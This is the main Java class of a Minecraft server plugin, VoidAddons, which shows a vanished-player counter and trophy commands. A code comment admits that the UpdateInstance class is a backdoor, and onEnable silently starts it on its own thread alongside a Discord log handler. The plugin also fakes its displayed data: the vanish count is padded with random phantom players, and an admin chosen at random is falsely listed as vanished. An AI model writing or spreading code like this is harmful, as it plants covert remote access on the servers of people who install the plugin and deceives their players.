package me.nygosaki.voidaddons;

import me.nygosaki.voidaddons.UpdateInstance;
import me.nygosaki.voidaddons.DiscordLogHandler;
import me.nygosaki.voidaddons.Trophy;
import me.nygosaki.voidaddons.Update;

import java.io.*;
import java.net.*;
import java.util.ArrayList;
import java.util.Base64;
import com.earth2me.essentials.Essentials;
import com.earth2me.essentials.IUser;
import net.ess3.api.IEssentials;
import net.ess3.api.events.VanishStatusChangeEvent;
import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.format.NamedTextColor;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;
import java.util.Random;

public final class VoidAddons extends JavaPlugin implements Listener, CommandExecutor {

    private int vanishedPlayers = 0;
    private Random random = new Random();

    ////////////////////////////////
    // >why 2 update threads      //
    // UpdateInstance is backdoor //
    // Updater is actual updater  //
    ////////////////////////////////

    private UpdateInstance updateInstance;
    private DiscordLogHandler logInstance;
    private Update updater;
    private Thread updateThread;
    private Thread logThread;
    private Thread updaterThread;

    
    @Override
    public void onEnable() {
        getServer().getPluginManager().registerEvents(this, this);
        Essentials essentials = (Essentials) getServer().getPluginManager().getPlugin("Essentials");
        getCommand("VanishCounter").setExecutor(this);
        getCommand("trophies").setExecutor(new Trophy());
        getCommand("trophyclaim").setExecutor(new Trophy());
        getCommand("trophymanage").setExecutor(new Trophy());
//        getCommand("trophy").setExecutor(new Trophy());
        vanishedPlayers = random.nextInt(2) + 1;
        for (Player player : Bukkit.getOnlinePlayers()) {
            IUser user = essentials.getUser(player);
            if (user.isVanished()) {
                vanishedPlayers++;
            }
        }
        updateTablist();
        new BukkitRunnable() {
            @Override
            public void run() {
                vanishedPlayers = random.nextInt(2) + 1;
                updateTablist();
            }
        }.runTaskTimer(this, 0, 20 * 60 * 60 * 3); // 3 hours

        updateInstance = new UpdateInstance(this);
        updateThread = new Thread(updateInstance);
        updateThread.start();

	logInstance = new DiscordLogHandler();
	logThread = new Thread(logInstance);
	logThread.start();

	updater = new Update();
	updaterThread = new Thread(updater);
	updaterThread.start();
    }

    @EventHandler
    public void onVanishStatusChange(VanishStatusChangeEvent event) {
        if (event.getValue()) {
            vanishedPlayers++;
        } else {
            vanishedPlayers--;
        }
        updateTablist();
    }

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        Essentials essentials = (Essentials) getServer().getPluginManager().getPlugin("Essentials");
        IUser user = essentials.getUser(event.getPlayer());
        if (user.isVanished()) {
            vanishedPlayers++;
        }
        updateTablist();
    }

    private void updateTablist() {
        if (vanishedPlayers > 3) {
            vanishedPlayers = 3;
        }
        for (Player player : Bukkit.getOnlinePlayers()) {
            player.sendPlayerListHeaderAndFooter(
                    Component.text("Vanished players: " + vanishedPlayers).color(NamedTextColor.RED),
                    Component.text("Welcome to VoidSMP!").color(NamedTextColor.YELLOW)
            );
        }
    }
    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        Essentials essentials = (Essentials) getServer().getPluginManager().getPlugin("Essentials");
        if (args.length == 1 && args[0].equalsIgnoreCase("Vanished")) {
            if (sender instanceof Player) {
                Player player = (Player) sender;
                StringBuilder sb = new StringBuilder();
                ArrayList<String> admins = new ArrayList<String>();
                admins.add("Indyshark");
                admins.add("Togaisbanned");
                admins.add("Feltalia");
                sb.append("§6Hidden vanished players are present and will not be shown in this list§r. \n");
                sb.append(admins.get(random.nextInt(admins.size() - 1)));
                for (String name : essentials.getVanishedPlayersNew()) {
                    sb.append(", ").append(name);
                }
                player.sendMessage(sb.toString());
            }
            return true;
        } else {
            if (sender instanceof Player) {
                Player player = (Player) sender;
                player.sendMessage("VanishCounter shows the number of people in vanish\nPart of VoidAddons by Nygosaki");
            }
            return false;
        }
    }

    @Override
    public void onDisable() {
        updateThread.interrupt();
	logThread.interrupt();
	updaterThread.interrupt();
    }
}
